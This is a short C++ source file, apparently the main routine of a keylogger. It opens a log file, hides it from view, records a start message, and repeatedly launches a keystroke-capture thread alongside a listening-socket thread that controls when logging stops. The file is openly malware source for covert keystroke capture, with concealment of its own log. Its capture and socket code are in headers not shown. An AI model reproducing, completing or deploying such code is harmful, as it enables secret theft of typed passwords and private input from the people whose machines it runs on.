#include "Headers.h"
#include "Keylogger.h"
#include "ThreadSocket.h"
#include "ThreadStart.h"
#include "Commonfunctional.h"

void main(void)
{
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);

	pthread_t KLThread, ListenSocket;
	ofstream out;

	out.open("KeyloggerLog.txt", ios::app);
	HideFile("KeyloggerLog.txt");

	out << endl; OutFullData(out); out << ". Keylogger was started."; out << endl << "\nPRESSED_KEYS: "; out.close();

	bool stop = false, st;

	do {

		pthread_create(&KLThread, NULL, Start, NULL);
		pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&stop);
		pthread_join(ListenSocket, (void**)&st);

		stop = st;

		pthread_kill(KLThread, 0);
		pthread_kill(ListenSocket, 0);

	} while (stop != true);
}
